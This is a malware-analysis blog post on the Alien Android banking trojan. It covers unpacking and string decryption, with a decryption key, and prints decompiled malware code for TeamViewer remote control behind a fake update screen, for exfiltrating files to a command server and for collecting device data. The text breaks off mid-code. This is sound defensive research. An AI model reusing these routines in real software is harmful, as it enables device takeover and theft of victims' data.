<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Technical analysis of Alien android malware - muha2xmad</title>
<meta name="description" content="بسم الله الرحمن الرحيم  ">


  <meta name="author" content="Muhammad Hasan Ali">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="muha2xmad">
<meta property="og:title" content="Technical analysis of Alien android malware">
<meta property="og:url" content="https://muha2xmad.github.io/malware-analysis/alien/">


  <meta property="og:description" content="بسم الله الرحمن الرحيم  ">



  <meta property="og:image" content="https://muha2xmad.github.io/assets/images/MA/alien/alien.jfif">





  <meta property="article:published_time" content="2022-09-25T00:00:00+00:00">





  

  


<link rel="canonical" href="https://muha2xmad.github.io/malware-analysis/alien/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Muhammad Hasan Ali",
      "url": "https://muha2xmad.github.io/"
    
  }
</script>


  <meta name="google-site-verification" content="yjK5jUGtGuvD9i_1SEaec8FrngezWj1KJqBbPuPRAQM" />





<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="muha2xmad Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site/lo.png">
<!-- <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site/lo.png"> -->
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site/lo.png" alt=""></a>
        
        <a class="site-title" href="/">
          muha2xmad
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Malware-analysis">Malware analysis</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Mal-Document">Mal Documents</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site/ed.jpg" alt="Muhammad Hasan Ali" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Muhammad Hasan Ali</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Malware Analysis</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Egypt</span>
        </li>
      

      
        
          
        
          
            <li><a href="https://twitter.com/muha2xmad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
        
          
            <li><a href="https://www.linkedin.com/in/muhammadhasanali/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/muha2xmad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Technical analysis of Alien android malware">
    <meta itemprop="description" content="بسم الله الرحمن الرحيم">
    <meta itemprop="datePublished" content="2022-09-25T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Technical analysis of Alien android malware
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  10 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#unpacking">Unpacking</a></li>
  <li><a href="#teamviewer-helps-the-devil">TeamViewer helps the devil</a></li>
  <li><a href="#data-exfiltration">Data exfiltration</a></li>
  <li><a href="#collected-data">Collected data</a></li>
  <li><a href="#recording-audio">Recording audio</a></li>
  <li><a href="#classic-features">Classic features</a>
    <ul>
      <li><a href="#call-and-call-forward">Call and call forward</a></li>
      <li><a href="#smishing">Smishing</a></li>
      <li><a href="#overlay-attack">Overlay attack</a></li>
    </ul>
  </li>
  <li><a href="#commands">Commands</a></li>
  <li><a href="#ioc">IoC</a></li>
  <li><a href="#article-quote">Article quote</a></li>
  <li><a href="#ref">REF</a></li>
</ul>

            </nav>
          </aside>
        
        <p><strong>بسم الله الرحمن الرحيم</strong></p>

<p><strong>FreePalestine</strong></p>

<h1 id="unpacking">Unpacking</h1>

<p>If you opened the sample in JEB decompiler, you will find classes names are obfuscated and contains nop code which makes the analysis of the code more harder and it’s an indicator that the sample is packed. So we need to get the decrypted payload. We will use this <a href="https://github.com/cryptax/misc-code/blob/master/frida_hooks/dex-dump.js">script</a> with <a href="https://github.com/frida/frida">Frida</a> to get the payload. I explained in details how to unpack a sample <a href="https://muha2xmad.github.io/malware-analysis/sova/">here</a> and <a href="https://twitter.com/muha2xmad/status/1570788983474638849">here</a>.</p>

<p>After unpacking the sample and get the payload, we see the strings is encrypted using Base64 and other ecryption routine. The encryption routine found in <code class="language-plaintext highlighter-rouge">d</code> located in <code class="language-plaintext highlighter-rouge">com.mhiauaqmlacl.ypmsfwbkjhsbeoz</code>. We will use this <a href="https://github.com/cryptax/misc-code/blob/master/AlienBankbotDecrypt.py">JEB script</a> but we will change the key value to <code class="language-plaintext highlighter-rouge">tycusvgndour</code>. Then add the script to the JEB decompiler. To add the script, press <code class="language-plaintext highlighter-rouge">F2</code> and <code class="language-plaintext highlighter-rouge">Create</code> then copy the script from github and paste it. To run the script, select the encrypted string and press execute the decrypted strings will be a comment. One by one you will find yourself decrypting all the strings and start analyzing the payload. Big thanks to <a href="https://twitter.com/cryptax">Axelle Ap.</a> for all the scripts.</p>

<p align="center">
  <img src="/assets/images/MA/alien/1.png" />
</p>
<center><font size="3"> <u>Figure</u>(1): decrypting keys and C2 server<u></u> </font></center>
<p><br /></p>

<h1 id="teamviewer-helps-the-devil">TeamViewer helps the devil</h1>

<p>This an amazing technique which allow the malware to do malicious things even if the user is opening the device. The malware will open an overlay screen which tells the user that <code class="language-plaintext highlighter-rouge">there's a system update you need to wait</code>. While the overlay screen is set over the screen, the malware will do malicious actions by conneecting to <code class="language-plaintext highlighter-rouge">TeamViewer</code> app.</p>

<p align="center">
  <img src="/assets/images/MA/alien/2.png" />
</p>
<center><font size="3"> <u>Figure</u>(2): Fake system update<u></u> </font></center>
<p><br /></p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="k">if</span><span class="p">(</span><span class="n">s2</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWJkNzMyYWFkYjM1NzUwYWJkYTkxYTVlNDgyMDdlZDhiMGNh"</span><span class="p">)))</span> <span class="p">{</span>  <span class="c1">// connect_teamviewer</span>
                    <span class="n">JSONObject</span> <span class="n">jSONObject6</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">s2</span><span class="p">);</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aK</span><span class="p">,</span> <span class="n">jSONObject6</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWJkNzMyYWFkYjM1NzUwYWJkYTkxYTVlNDgyMDdlZDhiMGNh"</span><span class="p">)));</span>  <span class="c1">// connect_teamviewer</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aL</span><span class="p">,</span> <span class="n">jSONObject6</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZjhkOTJmYjdjOTM5NzMzMQ=="</span><span class="p">)));</span>  <span class="c1">// password</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aO</span><span class="p">,</span> <span class="n">jSONObject6</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWVkOTM3YTE="</span><span class="p">)));</span>  <span class="c1">// fake</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aM</span><span class="p">,</span> <span class="n">jSONObject6</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTBkMTM4YTBkYjM4"</span><span class="p">)));</span>  <span class="c1">// hidden</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aN</span><span class="p">,</span> <span class="n">jSONObject6</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWFkNDMzYTdkNTNmNmYzMg=="</span><span class="p">)));</span>  <span class="c1">// blocking</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">f</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
                    <span class="n">i</span><span class="p">.</span><span class="nf">f</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWJkNzMxZWFjYTMzNjAzOGJmYTUxZTQ0NWIzYjM1YzdiYWNiOTZiODljYTY5MTNhZGFlYQ=="</span><span class="p">));</span>  <span class="c1">// com.teamviewer.host.market</span>
                    <span class="k">goto</span> <span class="n">label_5</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span><span class="p">(</span><span class="n">s2</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTdjODM5YWFlMTIyNjQzNGE0YmExMjU2NDkyYzY5"</span><span class="p">)))</span> <span class="p">{</span>  <span class="c1">// open_teamviewer</span>
                    <span class="n">JSONObject</span> <span class="n">jSONObject7</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">s2</span><span class="p">);</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aO</span><span class="p">,</span> <span class="n">jSONObject7</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWVkOTM3YTE="</span><span class="p">)));</span>  <span class="c1">// fake</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aM</span><span class="p">,</span> <span class="n">jSONObject7</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTBkMTM4YTBkYjM4"</span><span class="p">)));</span>  <span class="c1">// hidden</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aN</span><span class="p">,</span> <span class="n">jSONObject7</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWFkNDMzYTdkNTNmNmYzMg=="</span><span class="p">)));</span>  <span class="c1">// blocking</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">f</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
                    <span class="n">i</span><span class="p">.</span><span class="nf">f</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWJkNzMxZWFjYTMzNjAzOGJmYTUxZTQ0NWIzYjM1YzdiYWNiOTZiODljYTY5MTNhZGFlYQ=="</span><span class="p">));</span>  <span class="c1">// com.teamviewer.host.market</span>
                    <span class="k">goto</span> <span class="n">label_5</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span><span class="p">(</span><span class="n">s2</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZmJkZDMyYTBlMTI1NjQyMWJkYTUxNTU0NGQ="</span><span class="p">)))</span> <span class="p">{</span>  <span class="c1">// send_settings</span>
                    <span class="n">JSONObject</span> <span class="n">jSONObject8</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">s2</span><span class="p">);</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aO</span><span class="p">,</span> <span class="n">jSONObject8</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWVkOTM3YTE="</span><span class="p">)));</span>  <span class="c1">// fake</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aM</span><span class="p">,</span> <span class="n">jSONObject8</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTBkMTM4YTBkYjM4"</span><span class="p">)));</span>  <span class="c1">// hidden</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aN</span><span class="p">,</span> <span class="n">jSONObject8</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWFkNDMzYTdkNTNmNmYzMg=="</span><span class="p">)));</span>  <span class="c1">// blocking</span>
                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">f</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
                    <span class="k">goto</span> <span class="n">label_5</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span><span class="p">(!</span><span class="n">s2</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWNkZDJhYWRkZDMzNWUyMGE3YTAxNDUwNTU="</span><span class="p">)))</span> <span class="p">{</span>  <span class="c1">// device_unlock</span>
                    <span class="k">goto</span> <span class="n">label_5</span><span class="p">;</span>  <span class="c1">// device_unlock</span>
                <span class="p">}</span>

                <span class="n">JSONObject</span> <span class="n">jSONObject9</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">s2</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aO</span><span class="p">,</span> <span class="n">jSONObject9</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWVkOTM3YTE="</span><span class="p">)));</span>  <span class="c1">// fake</span>
                <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aM</span><span class="p">,</span> <span class="n">jSONObject9</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTBkMTM4YTBkYjM4"</span><span class="p">)));</span>  <span class="c1">// hidden</span>
                <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">aN</span><span class="p">,</span> <span class="n">jSONObject9</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWFkNDMzYTdkNTNmNmYzMg=="</span><span class="p">)));</span>  <span class="c1">// blocking</span>
                <span class="k">goto</span> <span class="n">label_553</span><span class="p">;</span>

            <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">}</span>
</code></pre></div></div>

<h1 id="data-exfiltration">Data exfiltration</h1>

<p>The malware has the ability to exfiltrate the data and sending specific files to the C2 server from the vitim’s device.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="n">s2</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTdjODM5YWFlMTMwNmUzOWFkYTkwOQ=="</span><span class="p">)))</span> <span class="p">{</span>  <span class="c1">// open_folder</span>
                    <span class="n">String</span> <span class="n">s3</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">s2</span><span class="p">).</span><span class="nf">getString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTdjODM5YWFlMTMwNmUzOWFkYTkwOQ=="</span><span class="p">));</span>  <span class="c1">// open_folder</span>
                    <span class="k">if</span><span class="p">(</span><span class="n">s3</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZjY5Nw=="</span><span class="p">)))</span> <span class="p">{</span>  <span class="c1">// ~/</span>
                        <span class="n">s3</span> <span class="p">=</span> <span class="n">Environment</span><span class="p">.</span><span class="nf">getExternalStorageDirectory</span><span class="p">().</span><span class="nf">getAbsolutePath</span><span class="p">();</span>
                    <span class="p">}</span>

                    <span class="n">String</span><span class="p">[]</span> <span class="n">arr_s</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">b</span><span class="p">(</span><span class="k">new</span> <span class="nf">File</span><span class="p">(</span><span class="n">s3</span><span class="p">));</span>
                    <span class="k">try</span> <span class="p">{</span>
                        <span class="n">JSONObject</span> <span class="n">jSONObject1</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">();</span>
                        <span class="n">jSONObject1</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWJkNTM4"</span><span class="p">),</span> <span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTljYTJlYTVjNzA5NjczY2E1YTkwODZjNTgyNjc3Y2JiMGNh"</span><span class="p">));</span>  <span class="c1">// array_files_folder</span>
                                                                                                                          <span class="c1">// cmd</span>
                        <span class="n">jSONObject1</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWNkMTJl"</span><span class="p">),</span> <span class="n">i</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="n">s3</span><span class="p">));</span>  <span class="c1">// dir</span>
                        <span class="n">jSONObject1</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWVkNzMwYTBkYjI0NzI="</span><span class="p">),</span> <span class="n">i</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="n">arr_s</span><span class="p">[</span><span class="m">0</span><span class="p">]));</span>  <span class="c1">// folders</span>
                        <span class="n">jSONObject1</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWVkMTMwYTFjZA=="</span><span class="p">),</span> <span class="n">i</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="n">arr_s</span><span class="p">[</span><span class="m">1</span><span class="p">]));</span>  <span class="c1">// files</span>
                        <span class="n">String</span> <span class="n">s4</span> <span class="p">=</span> <span class="n">jSONObject1</span><span class="p">.</span><span class="nf">toString</span><span class="p">().</span><span class="nf">replace</span><span class="p">(</span><span class="s">"\\n"</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
                        <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YzJlYjEzOGFlMTA1NDQxYjhk"</span><span class="p">),</span> <span class="n">s4</span><span class="p">);</span>  <span class="c1">// JSON_SEND</span>
                        <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">i</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">H</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">h</span><span class="p">(</span><span class="n">s4</span><span class="p">));</span>
                        <span class="k">goto</span> <span class="n">label_5</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">catch</span><span class="p">(</span><span class="n">JSONException</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                    <span class="p">}</span>

                    <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"Y2RjYTJlYWJjYzc2NmIyNmE2YTI1YjQxNWYzZDNiYzVhNmQ3OGNjNDk0YjY5NjM0Y2NlYWZlMTEzOTI2MDk0ODMxOGZkNzQ5OThkZQ=="</span><span class="p">));</span>  <span class="c1">// Error json rat jsonRequest open_folder</span>
                    <span class="k">goto</span> <span class="n">label_5</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span><span class="p">(!</span><span class="n">s2</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZmRjODMwYWJkZjMyNjgzYmFkOTMxZDVhNTIyYw=="</span><span class="p">)))</span> <span class="p">{</span>  <span class="c1">// uploadind_file</span>
                    <span class="k">goto</span> <span class="n">label_273</span><span class="p">;</span>  <span class="c1">// uploadind_file</span>
                <span class="p">}</span>

                <span class="n">jSONObject2</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">s2</span><span class="p">);</span>
            
</code></pre></div></div>

<h1 id="collected-data">Collected data</h1>

<p>The malware will collect data from the victim’s device such as battery percentage, language used on device, Accessibility Service status, phone number of the used line, Google accounts, and permissions obtained from the device. Then send it to the C2 server.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">try</span> <span class="p">{</span>  <span class="c1">// DM</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"Y2NmNQ=="</span><span class="p">),</span> <span class="n">s2</span><span class="p">);</span>  <span class="c1">// DM</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YzlmYw=="</span><span class="p">),</span> <span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTZjZDMwYTg="</span><span class="p">));</span>  <span class="c1">// null</span>
                                                                              <span class="c1">// AD</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"Y2FmNA=="</span><span class="p">),</span> <span class="n">i</span><span class="p">.</span><span class="nf">battary_percentage</span><span class="p">(</span><span class="n">context0</span><span class="p">));</span>  <span class="c1">// BL</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGNlZg=="</span><span class="p">),</span> <span class="n">jwozx0</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">sharedpref</span><span class="p">(</span><span class="n">context1</span><span class="p">,</span> <span class="n">c0</span><span class="p">.</span><span class="n">af</span><span class="p">));</span>  <span class="c1">// TW</span>
            <span class="n">String</span> <span class="n">s3</span> <span class="p">=</span> <span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGJmOQ=="</span><span class="p">);</span>  <span class="c1">// SA</span>
